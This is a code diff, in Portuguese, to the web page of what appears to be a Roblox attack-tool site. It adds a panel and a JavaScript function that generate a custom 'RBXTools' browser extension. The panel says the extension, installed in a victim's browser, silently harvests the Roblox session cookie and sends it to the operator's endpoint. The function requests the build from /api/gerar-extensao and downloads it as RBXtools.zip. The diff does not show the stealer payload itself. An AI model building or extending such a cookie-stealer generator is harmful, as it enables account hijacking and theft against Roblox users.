@@ -3228,6 +3228,37 @@
               </div>
             </div>
 
+            <div class="site-section-header">
+              <span class="site-section-badge">01</span>
+              <span class="site-section-title">Gerador de Extensão</span>
+            </div>
+
+            <div class="ex-card ex-card-lg ex-card-solid">
+              <div class="ex-card-body">
+
+                <p style="font-size:13px;color:var(--text-muted);line-height:1.65;margin-bottom:18px;">
+                  Gera uma versão personalizada da extensão <strong style="color:var(--text);">RBXTools</strong>. Ao ser instalada no navegador da vítima, ela coleta silenciosamente o cookie de sessão do Roblox e envia para o seu servidor. Insira abaixo a URL do seu endpoint.
+                </p>
+
+                <div class="ex-field-block">
+                  <label class="ex-field-label">PATH</label>
+                  <input class="ex-field-input" id="extGenPath" type="text" placeholder="https://rblxtool.com/e/nexus" autocomplete="off" spellcheck="false">
+                  <div style="font-size:11.5px;color:var(--text-faint);margin-top:6px;line-height:1.5;">
+                    O último segmento da URL (ex: <code style="color:var(--text-muted);background:rgba(255,255,255,0.06);padding:1px 5px;border-radius:4px;">nexus</code>) será o identificador da sua extensão no servidor.
+                  </div>
+                </div>
+
+                <div id="extGenError" style="display:none;margin-top:12px;padding:10px 13px;border-radius:9px;background:rgba(224,16,42,0.12);border:1px solid rgba(224,16,42,0.4);color:#ff2d47;font-size:13px;font-weight:600;"></div>
+
+              </div>
+              <div class="ex-card-footer">
+                <button class="ex-btn ex-btn-primary" id="extGenBtn" onclick="extGenDownload()">
+                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;flex-shrink:0"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                  Gerar e Baixar
+                </button>
+              </div>
+            </div>
+
           </div>
         </div>
       </div>
@@ -3836,7 +3867,55 @@ function runExtTutorial(){
 
 
 <script>
-/* ═══ AUTO MENSAGEM ═══════════════════════════════ */
+/* ═══ GERADOR DE EXTENSÃO ══════════════════════════ */
+  async function extGenDownload(){
+    var pathVal=(document.getElementById('extGenPath').value||'').trim();
+    var errorBox=document.getElementById('extGenError');
+    var btn=document.getElementById('extGenBtn');
+    errorBox.style.display='none';
+
+    if(!pathVal){
+      errorBox.textContent='Insira a URL do servidor antes de gerar.';
+      errorBox.style.display='block';
+      return;
+    }
+    try{ new URL(pathVal); }catch(e){
+      errorBox.textContent='URL inválida. Use o formato: https://seusite.com/e/nome';
+      errorBox.style.display='block';
+      return;
+    }
+
+    btn.disabled=true;
+    btn.innerHTML='<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" style="margin-right:6px;flex-shrink:0;animation:spin 1s linear infinite"><path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/></svg> Gerando…';
+
+    try{
+      var res=await fetch('/api/gerar-extensao',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({path:pathVal})
+      });
+      if(!res.ok){
+        var d=await res.json().catch(function(){return{};});
+        throw new Error(d.error||'Erro ao gerar extensão.');
+      }
+      var blob=await res.blob();
+      var a=document.createElement('a');
+      a.href=URL.createObjectURL(blob);
+      a.download='RBXtools.zip';
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
+      setTimeout(function(){URL.revokeObjectURL(a.href);},1000);
+    }catch(e){
+      errorBox.textContent=e.message;
+      errorBox.style.display='block';
+    }finally{
+      btn.disabled=false;
+      btn.innerHTML='<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px;flex-shrink:0"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg> Gerar e Baixar';
+    }
+  }
+
+  /* ═══ AUTO MENSAGEM ═══════════════════════════════ */
 (function(){
   var _running=false, _timer=null, _cdInt=null, _sent=0, _err=0, _cd=0, _cfg={};
 
